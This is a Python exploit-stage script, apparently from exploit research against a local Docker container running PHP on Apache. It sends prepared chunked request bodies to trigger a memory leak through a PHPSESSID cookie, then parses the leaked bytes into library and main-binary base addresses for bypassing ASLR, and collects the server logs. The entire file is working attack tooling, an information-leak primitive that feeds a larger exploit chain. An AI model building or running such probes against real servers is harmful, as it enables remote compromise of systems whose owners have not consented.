#!/usr/bin/env python3
"""A1->B1* probe (no A2/B2). Uses chain_app primitives (read-only)."""
import argparse, json, os, socket, subprocess, sys, time, hashlib

AD = '/tmp/opencode/research/9bie_addendum_20261022T160000Z/scripts'
sys.path.insert(0, AD)
import chain_app as ca  # noqa

BODY_DIR = '/tmp/opencode/research/9bie_fullchain_multiw_20261022T130520Z/bodies'

def sha(b): return hashlib.sha256(b).hexdigest()

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--port', type=int, required=True)
    ap.add_argument('--container', default='')
    ap.add_argument('--restart', action='store_true')
    ap.add_argument('--health-path', default='/')
    ap.add_argument('--a1-path', default='/')
    ap.add_argument('--b1-path', default='/')
    ap.add_argument('--n-b1', type=int, default=6)
    ap.add_argument('--a1', default=os.path.join(BODY_DIR, 'a1.bin'))
    ap.add_argument('--b1', default=os.path.join(BODY_DIR, 'b1_800k.bin'))
    ap.add_argument('--outdir', required=True)
    ap.add_argument('--timeout', type=float, default=300)
    ap.add_argument('--no-health', action='store_true')
    ap.add_argument('--tag', default='')
    args = ap.parse_args()
    os.makedirs(args.outdir, exist_ok=True)
    a1 = open(args.a1,'rb').read(); b1 = open(args.b1,'rb').read()
    rec = {'port': args.port, 'container': args.container, 'tag': args.tag,
           'a1_sha': sha(a1), 'b1_sha': sha(b1), 'b1_bytes': len(b1),
           'a1_path': args.a1_path, 'b1_path': args.b1_path, 'stages': []}
    if args.restart and args.container:
        subprocess.run(['docker','restart',args.container], check=True, stdout=subprocess.DEVNULL)
        time.sleep(1.5)
        for _ in range(60):
            try:
                s = socket.create_connection(('127.0.0.1', args.port), timeout=3)
                s.sendall(('GET %s HTTP/1.0\r\nHost: x\r\n\r\n' % args.health_path).encode())
                s.recv(4096); s.close(); break
            except OSError:
                time.sleep(0.5)
    if not args.no_health:
        try:
            s = socket.create_connection(('127.0.0.1', args.port), timeout=3)
            s.sendall(('GET %s HTTP/1.0\r\nHost: x\r\n\r\n' % args.health_path).encode())
            h = s.recv(4096); s.close()
            rec['health'] = {'status': h.split(b'\r\n',1)[0].decode('latin1','replace'), 'bytes': len(h)}
        except OSError as e:
            rec['health'] = {'error': repr(e)}
    def save(name, data):
        with open(os.path.join(args.outdir, name), 'wb') as fh: fh.write(data)
    try:
        t0=time.time()
        r = ca.send_chunked(args.port, args.a1_path, a1, args.timeout)
        rec['stages'].append({'stage':'A1','status':ca.status_of(r),'bytes':len(r),
                              'sha':sha(r),'elapsed':round(time.time()-t0,2)})
        save('a1.resp', r)
    except OSError as e:
        rec['stages'].append({'stage':'A1','error':repr(e)})
        print(json.dumps(rec, indent=1)); return 2
    hit=None
    for i in range(args.n_b1):
        try:
            t0=time.time()
            r = ca.send_chunked(args.port, args.b1_path, b1, args.timeout)
        except OSError as e:
            rec['stages'].append({'stage':'B1','i':i,'error':repr(e)})
            continue
        row = {'stage':'B1','i':i,'status':ca.status_of(r),'bytes':len(r),
               'elapsed':round(time.time()-t0,2),
               'has_setcookie': b'Set-Cookie: PHPSESSID=' in r}
        save('b1_%d.resp' % i, r)
        if row['has_setcookie']:
            try:
                info = ca.parse_leak(r, 0x65EB60)
                row['leak'] = {'decoded':info['decoded'],'zdtor':hex(info['zdtor']),
                               'lib':hex(info['lib']),'main':[hex(x) for x in info['main_candidates']],
                               'buckets':[[hex(b),c] for b,c in info['buckets'].most_common(4)]}
                hit={'i':i,'info':info}
            except Exception as e:
                row['leak'] = 'parse_error: %r' % (e,)
        rec['stages'].append(row)
        if hit: break
    rec['hit'] = None if not hit else {'i':hit['i'],'decoded':hit['info']['decoded'],
                                       'lib':hex(hit['info']['lib']),
                                       'main':[hex(x) for x in hit['info']['main_candidates']]}
    with open(os.path.join(args.outdir,'result.json'),'w') as fh: json.dump(rec, fh, indent=1)
    # logs
    if args.container:
        for cmd, name in ((['docker','exec',args.container,'tail','-n','80','/var/log/apache2/error.log'],'error.log'),
                          (['docker','exec',args.container,'cat','/var/log/apache2/p2s-access.log'],'access.log')):
            try:
                out = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
                open(os.path.join(args.outdir,name),'w').write(out.stdout[-20000:])
            except Exception as e:
                open(os.path.join(args.outdir,name),'w').write('ERR %r\n' % (e,))
    print(json.dumps({k:v for k,v in rec.items() if k!='stages'}, indent=1))
    for s in rec['stages']:
        print(s.get('stage'), s.get('i',''), s.get('status',''), s.get('bytes',''), 'LEAK' if s.get('has_setcookie') else '')
    return 0 if hit else 3

if __name__ == '__main__':
    raise SystemExit(main())
